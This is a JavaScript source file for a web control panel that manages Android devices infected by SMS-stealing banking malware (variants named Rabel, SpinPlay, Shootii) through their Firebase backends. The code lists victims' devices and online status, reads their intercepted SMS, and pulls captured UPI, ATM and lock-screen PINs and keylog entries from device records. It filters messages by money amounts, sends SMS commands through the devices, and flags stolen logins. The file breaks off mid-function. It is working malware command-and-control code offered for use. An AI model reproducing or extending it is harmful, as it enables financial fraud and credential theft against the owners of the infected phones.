var SEND_SMS_URL='nya.php?rebel_send_sms=1';
var FETCH_SMS_URL='nya.php?rebel_fetch_sms=1';
var APK_EXTRACT_URL='nya.php?rebel_apk_extract=1';
var FIREBASE_API_URL='nya.php?rebel_firebase_api=1';
var SMS_TOKEN_URL='nya.php?rebel_sms_token_api=1';
var allDevs=[], selDev='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
var deviceSmsCache={}, _smsLoadSeq=0, _smsLoading=false;
var SMS_CACHE_KEY='rbl_sms_cache';
var SMS_CACHE_MAX=100;
var _smsPersistTimer=null;
var devFilterMode='all', deviceBankCache={};
var currentView='home';
var moneyFilterMode='amount';
var moneyAmountMin=0,moneyAmountMax=Infinity;
var moneyMessagesList=[],moneyMessagesLoading=false;
var _initialLoadDone=false,_loadingVisible=false;
var PAGE_VIEWS={home:'view-home',online:'view-online',onlypin:'view-onlypin',liked:'view-liked',login:'view-login',money:'view-money',device:'view-device'};
var LIKED_KEY='nya_liked_devices';
var likedDevices={};
var _procDevsTimer=null, _panelPaused=false;
var SMS_POLL_MS=100, SMS_POLL_BG_MS=2000, SYNC_INTERVAL_MS=90000;
var SMS_RENDER_DEBOUNCE_MS=50;
var _smsRenderTimer=null, _sendInFlight=false;
var FB_LIST_KEY='nya_firebase_list';
var ACTIVE_FB_KEY='rbl_active_fb';
var activeFbId='';
var DEVICE_TOGGLE_KEY='rbl_device_toggles';
var deviceToggleState={};
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','admin_pass','passwords','webhook','tokens','auth','all_pas','sms_forward','guard','login','sms','messages','all_sms','new_sms','user_sms','sms_backup','notification','notifications','app_config','version','apk','update','banner','ads','payment','payments','otp','commands','manual_commands','outbox','smsQueue','send','sendSms','sendsms'];
/** Device list nodes — NOT user_sms/messages (those are SMS stores keyed by device id) */
var DEVICE_FETCH_NODES=[
  'clients','devices','devices_status','Verify_Device','user_list','user_data',
  'users','All_Users','All_User','AllClients','all_clients','online_devices','online_users',
  'clients_list','client_list','online_status','device_list','devices_list','device_data',
  'registered_users','active_devices','active_users','connected_devices','device_status','registeredDevices'
];
var SUMMARY_NODES=DEVICE_FETCH_NODES.slice();
var DEVICE_NODES=['devices','users','clients_list','online_devices','Verify_Device','user_list','user_data','clients'];
/** Per-device SMS subpaths used by Rabel / SpinPlay / Shootii panels */
var PANEL_SMS_SUFFIXES=['all_sms','new_sms','sms','messages','sms_inbox','inbox','received_sms','sent_sms','sms_list','user_sms','msg_list'];
/** Global SMS roots keyed by device id — rebel.py uses messages/{id} */
var PANEL_SMS_GLOBAL_NODES=['messages','user_sms','sms','all_sms','new_sms','sms_inbox','inbox','received_sms','sent_sms','sms_data','device_sms','client_sms','sms_logs','msg_store','text_messages','sms_backup'];

function looksLikePhone(v){
  if(v==null||v==='')return false;
  var s=String(v).trim();
  if(!s||s==='0'||s==='null'||s==='undefined')return false;
  var digits=s.replace(/\D/g,'');
  return digits.length>=10&&digits.length<=15;
}
function normalizePhoneDigits(v){
  var d=String(v||'').replace(/\D/g,'');
  if(d.length>=10)return d.slice(-10);
  return d;
}
function parseDevicePhone(v){
  if(v==null||v==='')return'';
  var s=String(v).trim();
  if(!s)return'';
  var parts=s.split(/[,;/|]+/);
  for(var i=0;i<parts.length;i++){
    var p=parts[i].trim();
    if(looksLikePhone(p))return normalizePhoneDigits(p);
  }
  if(looksLikePhone(s))return normalizePhoneDigits(s);
  return'';
}
function isHexDeviceKey(name){
  return typeof name==='string'&&/^[0-9a-f]{8,32}$/i.test(name);
}
function isSmsCommandRecord(raw){
  if(!raw||typeof raw!=='object')return false;
  if(raw.targetDeviceId&&(raw.messageText||raw.msg||raw.sendSms||raw.command||raw.cmd))return true;
  if(raw.webhookEvent&&(raw.cmd||raw.sendSms||raw.messageText||typeof raw.webhookEvent==='object'))return true;
  if(raw.command&&raw.messageText&&(raw.phoneNumber||raw.to||raw.sendSms))return true;
  return false;
}
var DEVICE_PHONE_KEYS=['phone_number','mobNo','phone','mobile','phone_no','cell','contact_no','mobile_no','sim_number','sim1','sim2','sim_1','sim_2','primary_phone','device_phone','user_phone','whatsapp','wa_number','caller_id','msisdn'];
var PHONE_ENRICH_NODES=['user_list','user_data','devices','devices_status','Verify_Device','All_Users','All_User','online_devices','device_list','registered_users','active_devices'];
/** rto9-style Firebase: these nodes hold SMS send commands, not device profiles */
var COMMAND_JUNK_NODES=['clients','users','data','sendsms','bots','Admin','admin'];
function isLikelySmsRootNode(name){
  if(!name||typeof name!=='string')return false;
  if(/^(config|settings|admin|rules|metadata|logs|test|passwords|webhook|tokens|auth|version|apk|update|banner|ads|payment|otp)$/i.test(name))return false;
  if(/^(sendsms|sendSms|smsQueue|send)$/i.test(name))return false;
  return /sms|message|inbox|msg|text|chat|mail|received|sent/i.test(name);
}
function isInboundSmsRootNode(name){
  if(!name)return false;
  if(/^(sendsms|sendSms|smsQueue|send)$/i.test(name))return false;
  return isLikelySmsRootNode(name);
}
function buildDynamicSmsPaths(d,inst){
  var id=d&&d.rawId, paths=[], roots=(inst&&inst.rootKeys)||[], smsRoots=(inst&&inst.smsRootKeys)||[];
  if(!id)return paths;
  smsRoots.forEach(function(key){if(key)paths.push(key+'/'+id);});
  roots.forEach(function(key){
    if(!key||SKIP_NODES.indexOf(key)>=0||isDeviceSummaryNode(key)||isHexDeviceKey(key))return;
    if(COMMAND_JUNK_NODES.indexOf(key)>=0)return;
    if(isLikelySmsRootNode(key)&&paths.indexOf(key+'/'+id)<0)paths.push(key+'/'+id);
  });
  return uniqPaths(paths);
}
function isRtoStyleUrl(url){
  return /rto9|rto0|rto91/i.test(url||'');
}
function isCommandOnlyRecord(s){
  if(!s||typeof s!=='object')return false;
  if(s.d_name||s.phone_number||s.modelName||s.Device_info||s.battery!==undefined)return false;
  return !!(s.cmd||s.targetDeviceId||(s.command&&s.messageText)||(s.webhookEvent&&s.sendSms));
}
function getDeviceDisplayPhone(s){
  if(!s)return'No Number';
  if(s._phoneSource&&(s._phoneSource==='user_list'||s._phoneSource==='user_data')&&s.mobNo){
    return parseDevicePhone(s.mobNo)||'No Number';
  }
  var p=parseDevicePhone(s.mobNo)||getPhoneFromRecord(s);
  return p||'No Number';
}
function isRabelPanel(inst){
  if(!inst)return false;
  var url=(inst.restUrl||'');
  if(inst.schema==='rabel')return true;
  if(inst.config&&(inst.config.preferredDeviceNode==='user_list'||inst.config.preferredDeviceNode==='user_data'))return true;
  return /rto9|rto0|rabel|raand|user_list|demon|jdhd|raki/i.test(url);
}
function isJunkSmsPath(path){
  if(!path)return true;
  var seg=String(path).split('/')[0];
  if(COMMAND_JUNK_NODES.indexOf(seg)>=0)return true;
  if(isHexDeviceKey(seg))return true;
  return false;
}
function getPrioritySmsPaths(d,inst){
  var id=d&&d.rawId, paths=[];
  if(!id)return paths;
  if(inst&&inst.smsIndex&&inst.smsIndex[id]&&inst.smsIndex[id].roots&&inst.smsIndex[id].roots.length){
    inst.smsIndex[id].roots.forEach(function(root){if(root)paths.push(root+'/'+id);});
    return uniqPaths(paths);
  }
  if(inst&&inst.smsRootKeys&&inst.smsRootKeys.length){
    inst.smsRootKeys.forEach(function(root){
      if(root&&isInboundSmsRootNode(root))paths.push(root+'/'+id);
    });
  }
  if(isRabelPanel(inst)||paths.length){
    ['user_sms','sms_backup','messages','all_sms','new_sms'].forEach(function(root){
      var p=root+'/'+id;
      if(paths.indexOf(p)<0)paths.push(p);
    });
  }
  return uniqPaths(paths);
}
function restJsonInstShallowNode(inst,node){
  var auths=getFbAuthCandidates(inst), i=0;
  function tryNext(){
    if(i>=auths.length)return Promise.resolve(null);
    var auth=auths[i++];
    var url=(inst.restUrl||'').replace(/\/$/,'')+'/'+String(node||'').replace(/^\//,'')+'.json?shallow=true';
    if(auth)url+='&auth='+encodeURIComponent(auth);
    return restJson(url).then(function(data){
      if(data===null||isFirebaseErr(data))return tryNext();
      return data;
    }).catch(function(){return tryNext();});
  }
  return tryNext();
}
function buildSmsIndex(inst){
  if(!inst||inst.smsIndexReady)return Promise.resolve();
  var scanRoots=['user_sms','sms_backup'];
  if(inst.smsRootKeys&&inst.smsRootKeys.length){
    scanRoots=uniqPaths(inst.smsRootKeys.filter(isInboundSmsRootNode).concat(scanRoots));
  }else if(isRabelPanel(inst)){
    scanRoots=['user_sms','sms_backup','messages','all_sms','new_sms'];
  }
  inst.smsIndex=inst.smsIndex||{};
  return Promise.all(scanRoots.map(function(root){
    return restJsonInstShallowNode(inst,root).then(function(keys){
      if(!keys||typeof keys!=='object')return;
      Object.keys(keys).forEach(function(devId){
        if(!devId)return;
        if(!inst.smsIndex[devId])inst.smsIndex[devId]={roots:[]};
        if(inst.smsIndex[devId].roots.indexOf(root)<0)inst.smsIndex[devId].roots.push(root);
      });
    }).catch(function(){});
  })).then(function(){
    inst.smsIndexReady=true;
    processClientsData();
  });
}
function deviceHasSmsInIndex(d){
  if(!d)return false;
  var inst=getFbInstance(d.fbId);
  return !!(inst&&inst.smsIndex&&inst.smsIndex[d.rawId]&&inst.smsIndex[d.rawId].roots&&inst.smsIndex[d.rawId].roots.length);
}
function buildUniversalSmsPaths(d,inst){
  var priority=getPrioritySmsPaths(d,inst);
  var rest=uniqPaths(smsPrimaryPaths(d,inst).concat(smsPathsForDevice(d,inst)).concat(buildDynamicSmsPaths(d,inst)));
  rest=rest.filter(function(p){return !isJunkSmsPath(p)&&priority.indexOf(p)<0;});
  return priority.concat(rest);
}

// ---- FIX: Online status accuracy ----
var ONLINE_FRESH_MS=60000;
var ONLINE_STALE_MS=120000;
var ONLINE_FLAG_TRUST_MS=180000;

function extractHeartbeatMs(raw){
  if(!raw||typeof raw!=='object') return 0;
  var keys=['_lastOnlineMs','last_seen','lastSeen','last_ping','lastPing','last_ping_at','lastPingAt','updated_at','updatedAt','timestamp','timestamp_millis','heartbeat','last_heartbeat','ping_at','ping_time','seen_at'];
  var best=0,i,ms;
  for(i=0;i<keys.length;i++){ms=toTimestampMs(raw[keys[i]]);if(ms>best) best=ms;}
  if(raw.live_data&&typeof raw.live_data==='object'){ms=extractHeartbeatMs(raw.live_data);if(ms>best) best=ms;}
  if(raw.device_info&&typeof raw.device_info==='object'){ms=extractHeartbeatMs(raw.device_info);if(ms>best) best=ms;}
  return best;
}
function toTimestampMs(v){if(v==null||v==='')return 0;if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;if(typeof v==='string'){if(!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}var t=Date.parse(v);if(!isNaN(t))return t;}return 0;}
function hasExplicitOnlineFlag(s){if(!s)return false;return s.online_status===true||s.online===true||s.status===true||s.status==='online';}
function hasExplicitOfflineFlag(s){if(!s)return false;return s.online_status===false||s.status===false||s.status==='offline';}
function resolveOnlineStatus(s,fbId){
  if(!s)return false;
  if(isCommandOnlyRecord(s))return false;
  if(hasApkModelName(s)&&s.status!==undefined)return isApkOnlineRaw(s);
  var now=Date.now();
  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
  var hb=extractHeartbeatMs(s);var hbAge=hb?now-hb:Infinity;
  var flagOn=hasExplicitOnlineFlag(s);var flagOff=hasExplicitOfflineFlag(s);
  if(schema==='rabel'&&(s.status===true||s.online===true))flagOn=true;
  if(flagOn){if(!hb)return true;if(hbAge<=ONLINE_FLAG_TRUST_MS)return true;if(hbAge>ONLINE_FLAG_TRUST_MS*2)return false;return true;}
  if(flagOff){if(hb&&hbAge<=ONLINE_FRESH_MS)return true;return false;}
  if(hb&&hbAge<=ONLINE_STALE_MS)return true;return false;
}

function isDeviceSummaryNode(name){
  if(!name||typeof name!=='string')return false;
  if(SKIP_NODES.indexOf(name)>=0)return false;
  if(SUMMARY_NODES.indexOf(name)>=0||DEVICE_FETCH_NODES.indexOf(name)>=0)return true;
  if(/^Verify_/i.test(name))return true;
  if(/^(All_|all_)/.test(name))return true;
  if(/_(list|lists|data|sms|devices|status|users)$/i.test(name))return true;
  if(/^(client|device|user|online|registered|active|connected)/i.test(name))return true;
  if(/^[0-9a-f]{8,32}$/i.test(name))return false;
  return false;
}
function getDeviceNodesForInst(inst){
  var nodes=DEVICE_FETCH_NODES.slice();
  if(inst&&inst.config){
    if(inst.config.preferredDeviceNode&&nodes.indexOf(inst.config.preferredDeviceNode)<0)nodes.unshift(inst.config.preferredDeviceNode);
    if(Array.isArray(inst.config.deviceNodes)){
      inst.config.deviceNodes.forEach(function(n){
        if(n&&nodes.indexOf(n)<0)nodes.unshift(n);
      });
    }
  }
  return nodes.filter(function(n,i,a){return n&&a.indexOf(n)===i;});
}
function detectSchemaFromRoots(roots,inst){
  if(!roots||typeof roots!=='object')return (inst&&inst.schema)||'spinplay';
  if(roots.Verify_Device||roots.verify_device)return 'shootii';
  if(roots.user_list||roots.user_data||roots.All_Users||roots.All_User)return 'rabel';
  if(roots.messages||roots.clients)return 'rabel';
  if(roots.devices||roots.devices_status||roots.Verify_Device)return 'spinplay';
  var url=(inst&&inst.restUrl)||'';
  if(/rabel|raand|user_list|demon|jdhd|rto9|rto0|raki/i.test(url))return 'rabel';
  if(/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i.test(url))return 'shootii';
  return (inst&&inst.schema)||'spinplay';
}
function getSmsDeviceBases(d,inst){
  var node=(d&&d.deviceNode)||'clients';
  var bases=[node,'clients','devices','devices_status','Verify_Device','user_list','user_data','users','All_Users','All_User','online_devices','clients_list'];
  if(inst&&inst.config){
    if(inst.config.preferredDeviceNode){
      var pref=inst.config.preferredDeviceNode;
      bases=bases.filter(function(b){return b!==pref;});
      bases.unshift(pref);
    }
    if(Array.isArray(inst.config.deviceNodes)){
      inst.config.deviceNodes.slice().reverse().forEach(function(n){
        if(!n)return;
        bases=bases.filter(function(b){return b!==n;});
        bases.unshift(n);
      });
    }
  }
  if(inst&&inst.schema==='shootii'&&bases.indexOf('Verify_Device')<0)bases.unshift('Verify_Device');
  var out=[],seen={};
  bases.forEach(function(b){if(b&&!seen[b]){seen[b]=1;out.push(b);}});
  return out;
}
function uniqPaths(list){
  var out=[],seen={};
  (list||[]).forEach(function(p){
    if(!p||seen[p])return;
    seen[p]=1;out.push(p);
  });
  return out;
}
var DEFAULT_FIREBASES=typeof REBEL_DEFAULT_FIREBASES!=='undefined'?REBEL_DEFAULT_FIREBASES:[];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function escAttr(s){return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
function getRawDev(id){return clientsRawMap[id]||{};}
function parseApkBool(v){
  if(v===true||v===1)return true;
  if(v===false||v===0)return false;
  if(v==null||v==='')return false;
  var s=String(v).trim().toLowerCase();
  if(s==='true'||s==='1'||s==='online'||s==='yes')return true;
  if(s==='false'||s==='0'||s==='offline'||s==='no')return false;
  return false;
}
function deviceOnlineFromRaw(s,fbId){
  if(!s)return false;
  if(s.status!==undefined&&s.status!==null&&String(s.status)!==''){
    if(parseApkBool(s.status))return true;
    var sl=String(s.status).toLowerCase();
    if(s.status===false||sl==='false'||sl==='0'||sl==='offline')return false;
  }
  return resolveOnlineStatus(s,fbId);
}
function isApkYes(v){return String(v||'').toLowerCase()==='yes';}
function hasApkModelName(raw){return !!(raw&&raw.modelName!=null&&String(raw.modelName).trim());}
function getApkUpiPin(raw){
  if(!raw)return '';
  var p=raw.upipin!=null?String(raw.upipin).trim():'';
  return p||extractPinFromRecord(raw)||'';
}
function getApkMobNo(raw,d){
  if(raw&&raw.mobNo!=null&&String(raw.mobNo).trim())return String(raw.mobNo).trim();
  return d&&d.displayPhone||'No Number';
}
function getDeviceSmsPhone(d){
  if(!d)return'';
  var raw=getRawDev(d.id);
  var mob=getApkMobNo(raw,d);
  if(!mob||mob==='No Number'||/^unknown$/i.test(String(mob).trim()))return'';
  var clean=String(mob).trim().replace(/\s/g,'');
  if(clean.indexOf('+')===0)return clean;
  var digits=normalizePhone(clean);
  if(digits.length===10)return'+91'+digits;
  return clean||digits;
}
function fillDeviceSmsTo(d,force){
  var toEl=document.getElementById('smsTo');
  if(!toEl||!d)return;
  if(!force&&toEl.value&&String(toEl.value).trim())return;
  var phone=getDeviceSmsPhone(d);
  if(phone)toEl.value=phone;
}
function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
function getApkJoined(raw){return raw&&raw.joined!=null?String(raw.joined):'';}
function isApkLiked(id){return isApkYes(getRawDev(id).liked);}
function isApkChecked(id){return parseApkBool(getRawDev(id).checked);}
function isApkLoggedIn(id){return isApkYes(getRawDev(id).login);}
function isApkOnlineRaw(raw){return parseApkBool(raw&&raw.status);}
function hasApkUpiPin(id){return !!getApkUpiPin(getRawDev(id)).trim();}
function parseJoinedToMs(joined){
  if(!joined)return 0;
  var s=String(joined).trim();
  var m=s.match(/(\d{1,2})\/(\d{1,2})\/(\d{4})/);
  if(m){
    var dt=new Date(+m[3],+m[2]-1,+m[1]);
    if(!isNaN(dt.getTime()))return dt.getTime();
  }
  var n=Date.parse(s);
  return isNaN(n)?0:n;
}
function patchClientField(d,fields,okMsg){
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return Promise.resolve(false);}
  var node='clients/'+d.rawId;
  var url=buildRestUrl(inst,node,getFbAuthKey(inst));
  return fetch(url,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(fields)})
    .then(function(r){return r.json().then(function(j){return{ok:r.ok,j:j};});})
    .then(function(res){
      if(res.ok){
        var raw=clientsRawMap[d.id]||{};
        Object.keys(fields).forEach(function(k){raw[k]=fields[k];});
        clientsRawMap[d.id]=raw;
        processClientsDataNow();
        if(okMsg)toast(okMsg,true);
        return true;
      }
      toast((res.j&&res.j.error)||'Update failed',false);
      return false;
    }).catch(function(){toast('Update failed',false);return false;});
}
function loadLiked(){likedDevices={};}
function saveLiked(){}
function isLiked(id){return isApkLiked(id);}
function toggleLike(id,ev){
  if(ev){ev.stopPropagation();ev.preventDefault();}
  var d=allDevs.find(function(x){return x.id===id;});
  if(!d)return;
  var next=isApkLiked(id)?'no':'yes';
  patchClientField(d,{liked:next},next==='yes'?'Liked':'Disliked');
}
function getSearchQuery(){
  var map={home:'searchHome',online:'searchOnline',onlypin:'searchPin',liked:'searchLiked',login:'searchLogin',money:'searchMoney',device:'searchDevice'};
  var el=document.getElementById(map[currentView]||'searchHome');
  return (el&&el.value||'').toLowerCase();
}
function getActiveListEl(){
  var map={home:'devList',online:'devListOnline',onlypin:'devListPin',liked:'devListLiked',login:'devListLogin',money:'devListMoney',device:'devListDeviceSms'};
  return document.getElementById(map[currentView]||'devList');
}
function getAllListEls(){
  return ['devList','devListOnline','devListPin','devListLiked','devListLogin','devListMoney','devListDeviceSms'].map(function(id){return document.getElementById(id);}).filter(Boolean);
}
function setText(id,txt){var el=document.getElementById(id);if(el)el.textContent=txt;}
function showPage(view){
  view=view||'home';
  if(view!=='device')currentView=view;
  if(view==='online')devFilterMode='online';
  else if(view==='onlypin')devFilterMode='pin';
  else if(view==='liked')devFilterMode='liked';
  else if(view==='login')devFilterMode='login';
  else if(view==='money'){devFilterMode='money';moneyFilterMode='amount';}
  else if(view==='home')devFilterMode='all';
  Object.keys(PAGE_VIEWS).forEach(function(k){
    var el=document.getElementById(PAGE_VIEWS[k]);
    if(el)el.classList.toggle('active',k===currentView);
  });
  updatePanelTitles();
  if(currentView==='money'){
    moneyMessagesList=[];
    loadMoneyMessages(true).then(function(){renderMoneyView();updateStats();});
  }else if(currentView==='device'){
    renderDeviceDetail();
    renderDeviceSmsList();
  }else{
    renderDevices();
  }
  updateStats();
  window.scrollTo(0,0);
}
function updatePanelTitles(){
  var name=activeFbId?getActiveFbName():'Android Management XYZ';
  setText('panelTitleOnline',name);
  setText('panelTitlePin',name);
  setText('panelTitleLogin',name);
}
function formatDevDate(d){
  var raw=clientsRawMap[d.id]||{};
  var joined=getApkJoined(raw);
  if(joined)return 'DATE: '+joined;
  var ts=raw._lastOnlineMs||raw.last_seen||raw.updated_at||raw.timestamp||Date.now();
  var dt=new Date(typeof ts==='number'&&ts<1e12?ts*1000:ts);
  if(isNaN(dt.getTime()))return 'DATE: —';
  var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
  var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
  h=h%12||12;
  return 'DATE: '+dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
}
function setMoneyFilter(mode){
  moneyFilterMode=mode||'amount';
  if(mode==='active')renderMoneyView();
  else pickMoneyAmountRange();
}
function pickMoneyAmountRange(){
  var opts=['₹10K - ₹30K','₹30K - ₹50K','₹50K - ₹100K','Above ₹100K'];
  var ranges=[[10000,30000],[30000,50000],[50000,100000],[100000,Infinity]];
  var pick=window.prompt('Select amount range:\n0 = ₹10K-₹30K\n1 = ₹30K-₹50K\n2 = ₹50K-₹100K\n3 = Above ₹100K','0');
  if(pick==null)return;
  var idx=parseInt(pick,10);
  if(isNaN(idx)||idx<0||idx>3)idx=0;
  moneyAmountMin=ranges[idx][0];moneyAmountMax=ranges[idx][1];moneyFilterMode='amount';
  renderMoneyView();
}
function deviceHasLogin(d){
  if(isApkLoggedIn(d.id))return true;
  var raw=clientsRawMap[d.id];
  if(!raw||typeof raw!=='object')return false;
  return !!(raw.password||raw.Pass||raw.pass||(raw.username&&raw.password));
}
function goHome(){showPage('home');}
function goOnlyPin(){showPage('onlypin');}
function setFilter(mode,btn){
  if(mode==='online')showPage('online');
  else if(mode==='pin'||mode==='onlypin')showPage('onlypin');
  else if(mode==='liked')showPage('liked');
  else if(mode==='login')showPage('login');
  else if(mode==='money'||mode==='bank')showPage('money');
  else showPage('home');
}
function showLoading(on,force){
  if(on&&!force&&_initialLoadDone)return;
  _loadingVisible=!!on;
  var el=document.getElementById('loading');
  if(el)el.classList.toggle('show',_loadingVisible);
}
function deleteChecked(){
  if(!confirm('Are you sure you want to delete ALL clients and messages?'))return;
  var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
  if(!insts.length){toast('No Firebase project',false);return;}
  showLoading(true,true);
  Promise.all(insts.map(function(inst){
    var auth=getFbAuthKey(inst);
    var base=(inst.restUrl||'').replace(/\/$/,'');
    return Promise.all([
      fetch(buildRestUrl(inst,'clients',auth),{method:'DELETE'}),
      fetch(buildRestUrl(inst,'messages',auth),{method:'DELETE'})
    ]);
  })).then(function(){
    clientsRawMap={};allDevs=[];selDev='';moneyMessagesList=[];
    clearListeners();processClientsDataNow();renderMoneyView();
    showLoading(false,true);
    toast('All data deleted',true);
  }).catch(function(){showLoading(false,true);toast('Delete failed',false);});
}
function deleteDeviceCard(id,ev){
  if(ev){ev.stopPropagation();ev.preventDefault();}
  var d=allDevs.find(function(x){return x.id===id;});
  if(!d)return;
  if(!confirm('Delete this device from Firebase?'))return;
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return;}
  var url=buildRestUrl(inst,'clients/'+d.rawId,getFbAuthKey(inst));
  fetch(url,{method:'DELETE'}).then(function(r){
    if(r.ok){
      delete clientsRawMap[d.id];
      if(selDev===id){selDev='';clearListeners();}
      toast('Deleted',true);
      processClientsDataNow();
    }else toast('Delete failed',false);
  }).catch(function(){toast('Delete failed',false);});
}
function closeSmsModal(ev){
  if(ev&&ev.target&&ev.target.id!=='smsModal'&&ev.type==='click')return;
  var m=document.getElementById('smsModal');
  if(m)m.classList.remove('open');
  closeDeviceDetail();
}
function bindDevListEvents(){
  getAllListEls().forEach(function(el){
    if(!el||el._rebelBound)return;
    el._rebelBound=true;
    el.addEventListener('click',function(e){
      var like=e.target.closest('.dev-like');
      if(like){
        e.preventDefault();e.stopPropagation();
        var cid=like.getAttribute('data-dev-id');
        if(cid)toggleLike(cid,e);
        return;
      }
      var del=e.target.closest('.dev-del');
      if(del){
        e.preventDefault();e.stopPropagation();
        var did=del.getAttribute('data-dev-id');
        if(did)deleteDeviceCard(did,e);
        return;
      }
      var chk=e.target.closest('.dev-check input');
      if(chk){
        e.stopPropagation();
        var wrap=chk.closest('.dev-check');
        var tid=wrap&&wrap.getAttribute('data-dev-id');
        if(tid){
          var dev=allDevs.find(function(x){return x.id===tid;});
          if(dev)patchClientField(dev,{checked:chk.checked});
        }
        return;
      }
      var card=e.target.closest('.dev-card');
      if(!card)return;
      var id=card.getAttribute('data-dev-id');
      if(id)selectDevice(id);
    });
  });
}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function extractPinFromRecord(raw){
  if(!raw||typeof raw!=='object')return '';
  var keys=['pin','PIN','upipin','upiPin','device_pin','devicePin','mpin','MPIN','upi_pin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
  var check=function(obj){
    if(!obj||typeof obj!=='object')return '';
    var i,v,s;
    for(i=0;i<keys.length;i++){
      v=obj[keys[i]];
      if(v==null)continue;
      s=String(v).trim();
      if(s&&s!=='0'&&s!=='null'&&s!=='undefined')return s;
    }
    return '';
  };
  var p=check(raw), nests=['device_info','live_data','deviceInfo','liveData','data','info','captured','keylog','key_log','upi','bank','credentials'], i, j, k, v, s;
  if(p)return p;
  for(i=0;i<nests.length;i++){if(raw[nests[i]]){p=check(raw[nests[i]]);if(p)return p;}}
  function deepScan(obj,depth){
    if(!obj||typeof obj!=='object'||depth>4)return '';
    for(k in obj){
      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
      v=obj[k];
      if(/pin/i.test(k)&&v!=null){
        s=String(v).trim();
        if(s&&s!=='0'&&s!=='null'&&/^\d{4,8}$/.test(s))return s;
      }
      if(v&&typeof v==='object'){s=deepScan(v,depth+1);if(s)return s;}
    }
    return '';
  }
  return deepScan(raw,0);
}
function deviceHasPin(d){
  if(hasApkUpiPin(d.id))return true;
  var raw=clientsRawMap[d.id];
  return !!(d.pin||extractPinFromRecord(raw));
}
function deviceMatchesApkFilter(d,view){
  var raw=getRawDev(d.id);
  if(view==='online'||devFilterMode==='online')return d.status==='online';
  if(view==='onlypin'||devFilterMode==='pin')return deviceHasPin(d);
  if(view==='liked'||devFilterMode==='liked')return isApkYes(raw.liked);
  if(view==='login'||devFilterMode==='login'){
    if(isApkYes(raw.login))return true;
    return hasApkModelName(raw)&&isApkYes(raw.login);
  }
  return true;
}
function getFilteredDevs(){
  var list=allDevs;
  if(activeFbId)list=list.filter(function(d){return d.fbId===activeFbId;});
  if(currentView!=='home'&&currentView!=='device'&&currentView!=='money'){
    list=list.filter(function(d){return deviceMatchesApkFilter(d,currentView);});
  }else if(devFilterMode==='online')list=list.filter(function(d){return deviceMatchesApkFilter(d,'online');});
  else if(devFilterMode==='pin')list=list.filter(function(d){return deviceMatchesApkFilter(d,'onlypin');});
  else if(devFilterMode==='liked')list=list.filter(function(d){return deviceMatchesApkFilter(d,'liked');});
  else if(devFilterMode==='login')list=list.filter(function(d){return deviceMatchesApkFilter(d,'login');});
  return list;
}
function loadActiveFb(){
  try{
    var s=localStorage.getItem(ACTIVE_FB_KEY);
    activeFbId=s||'';
  }catch(e){activeFbId='';}
}
function saveActiveFb(){
  try{localStorage.setItem(ACTIVE_FB_KEY,activeFbId||'');}catch(e){}
}
function ensureActiveFbValid(){
  if(activeFbId&&!firebaseConfigs.some(function(c){return c.id===activeFbId;}))activeFbId='';
}
function getActiveFbName(){
  if(!activeFbId)return 'All Firebase Combined';
  var inst=getFbInstance(activeFbId);
  return inst?inst.name:'Firebase';
}
function getHdrSubText(){
  if(!firebaseConfigs.length)return 'Add a Firebase project to start';
  if(activeFbId)return getFilteredDevs().length+' devices · '+getActiveFbName();
  return allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
}
function selectFirebase(fbId){
  activeFbId=fbId||'';
  saveActiveFb();
  if(selDev&&activeFbId){
    var d=getSelDev();
    if(d&&d.fbId!==activeFbId){
      selDev='';
      clearListeners();
    }
  }
  renderFirebaseTab();
  renderDevices();
  updateStats();
  updateFbUi();
  toast('Switched to '+getActiveFbName(),true);
  closeFbSheet();
}
function bindFirebaseTabEvents(){}
function renderFirebaseTab(){updateFbUi();}
function setDevFilter(mode,btn){setFilter(mode,btn);}
function saveFirebaseConfigs(){
  try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}
}
function loadDeviceToggles(){
  try{
    var s=localStorage.getItem(DEVICE_TOGGLE_KEY);
    if(s)deviceToggleState=JSON.parse(s)||{};
  }catch(e){deviceToggleState={};}
}
function saveDeviceToggles(){
  try{localStorage.setItem(DEVICE_TOGGLE_KEY,JSON.stringify(deviceToggleState));}catch(e){}
}
function isDeviceChecked(id){return isApkChecked(id);}
function toggleDeviceCheck(id,ev){
  if(ev){ev.stopPropagation();ev.preventDefault();}
  var d=allDevs.find(function(x){return x.id===id;});
  if(!d)return;
